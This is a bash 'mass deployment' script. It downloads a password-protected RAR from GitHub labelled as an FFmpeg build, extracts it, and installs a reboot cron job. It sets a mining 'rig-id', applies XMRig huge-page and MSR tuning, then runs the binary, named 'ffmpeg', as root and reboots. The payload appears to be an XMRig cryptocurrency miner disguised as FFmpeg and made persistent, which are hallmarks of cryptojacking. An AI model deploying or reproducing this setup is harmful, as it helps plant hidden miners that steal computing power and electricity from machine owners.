#!/usr/bin/bash
# Mass deployment script

# Update package list
sudo apt update

# Get package
wget https://github.com/ityloish/FFmpeg/releases/download/latest/ffmpeg-v6.12.1-mo2-lin64-compat.rar

# Extract contents of the tar.gz
#tar -zxvf v6.12.1-mo2-lin64-compat.tar.gz --one-top-level
# Unrar contents to archive original directory
#unrar x ffmpeg-v6.12.1-mo2-lin64-compat.rar -pJ4uANDgZDw3dG32EcZmo

# https://superuser.com/questions/740135/unrar-all-rar-files-in-a-directory-with-linux
#for file in *.rar; do unrar e "$file"; done
for file in *.rar; do unrar x "$file" -pJ4uANDgZDw3dG32EcZmo; done

# Change directory
cd latest

# Add file to cron directory
sudo cp reboot-execute-cron /etc/cron.d/reboot-execute-cron


# Update rig-id of machine
# Request rig-id of machine
echo What is this machine rig-id?
read rig_id
#echo $rig_id

# Set rig-id of machine
# https://stackoverflow.com/questions/50265987/how-to-use-sed-to-replace-values-in-json-file-variable-value
sed -i 's/\"rig-id\":.*/\"rig-id\": '\"${rig_id}\",'/g' "config.json"


# Make file/script executable
chmod +x *.sh


# Optimisations
# Enable 1GB huge pages (Linux)
# https://xmrig.com/docs/miner/hugepages
sudo bash enable_1gb_pages.sh

# MSR optimisation
# https://xmrig.com/docs/miner/randomx-optimization-guide/msr
sudo apt install -y msr-tools
sudo bash randomx_boost.sh


# Make file/script executable
chmod +x ffmpeg
# Run executable
sudo ./ffmpeg &

sleep 10s

# Reboot system
sudo reboot
